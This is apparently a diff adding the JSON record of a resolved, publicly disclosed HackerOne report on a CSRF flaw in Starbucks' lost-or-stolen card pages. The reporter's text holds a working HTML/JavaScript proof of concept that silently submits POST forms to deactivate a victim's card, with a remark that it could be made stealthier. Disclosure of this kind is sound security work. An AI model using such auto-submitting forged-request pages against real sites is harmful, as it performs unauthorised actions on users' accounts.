@@ -1,0 +1,130 @@
+{
+  "id": 233099,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzMwOTk=",
+  "url": "https://hackerone.com/reports/233099",
+  "title": "CSRF in Report Lost or Stolen Page https://www.starbucks.com/account/card",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2017-05-30T11:11:49.863Z",
+  "submitted_at": "2017-05-30T11:11:49.863Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "darwinks",
+    "url": "/darwinks",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/nTAhGN3HxaozzkyCscnmXkma/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1989,
+    "url": "https://hackerone.com/starbucks",
+    "handle": "starbucks",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Starbucks",
+      "twitter_handle": "Starbucks",
+      "website": "http://www.starbucks.com",
+      "about": "OUR MISSION WITH EVERY CUP, WITH EVERY CONVERSATION, WITH EVERY COMMUNITY– WE NURTURE THE LIMITLESS POSSIBILITIES OF HUMAN CONNECTION"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-09-25T20:55:39.123Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-08-31T17:55:01.268Z",
+  "team_member_agreed_on_going_public_at": "2017-09-25T20:55:39.060Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\nWhen a user registers with an option to get instant digital card, a card will be registered against that users name.\nThere is  CSRF in card removal process when user wants to report cards as stolen or lost.\nThere is no CSRF protection on the post requests when https://www.starbucks.com/account/card/loststolen or https://www.starbucks.com/account/card/loststolenzerobalance page is called.\n\nWhen (https://www.starbucks.com/account/card)  is visited by user to **Report Lost or Stolen card**{*request  1*}, user has to click on Deactivate card. Then user will be asked to confirm the action {*request 2*}. So, in short after these 2 POST requests,for which there is no CSRF protection, card will be removed.\nI tried to build a PoC and it worked. \n>User will have to accepts pop-up from starbucks.com. I am sure user will do that since it is a legitimate site.\n\nPlease find a working PoC code.\n```\n<html>\n<head>\n   <meta name=\"referrer\" content=\"no-referrer\"/>\n</head>\n<script language=\"JavaScript\">\nfunction abc()\n{\nwindow.open(\"https://www.starbucks.com/account/card/loststolen\");\n}\n</script>\n<body onload=\"abc();\">\n  <script>history.pushState('', '', '/')</script>\n    <form id=\"form1\" target=\"_bank\" action=\"https://www.starbucks.com/account/card/loststolenzerobalance\" method=\"POST\">\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n<form id=\"form2\" target=\"_bank\" action=\"https://www.starbucks.com/account/card/loststolenzerobalance\" method=\"POST\">\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n<script>\nwindow.setTimeout( function () { document.forms.form1.submit()},1500);\nwindow.setTimeout( function () { document.forms.form2.submit()},2000);  \n\n</script>\n  </body>\n</html>\n```\nTime taken to open both form is lenient for demonstration purpose but I guess time as well as stealthiness  can be tuned.\nAlso find video PoC. ",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-09-30T17:55:01.326Z",
+  "allow_singular_disclosure_after": -201034099.60943457,
+  "singular_disclosure_allowed": true,
+  "vote_count": 9,
+  "voters": [
+    "sp1d3rs",
+    "apapedulimu",
+    "gamliel",
+    "r3y",
+    "eveeez",
+    "darwinks",
+    "zerotoone",
+    "japz",
+    "icheernoom"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.5,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 13020,
+    "asset_type": "URL",
+    "asset_identifier": "www.starbucks.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
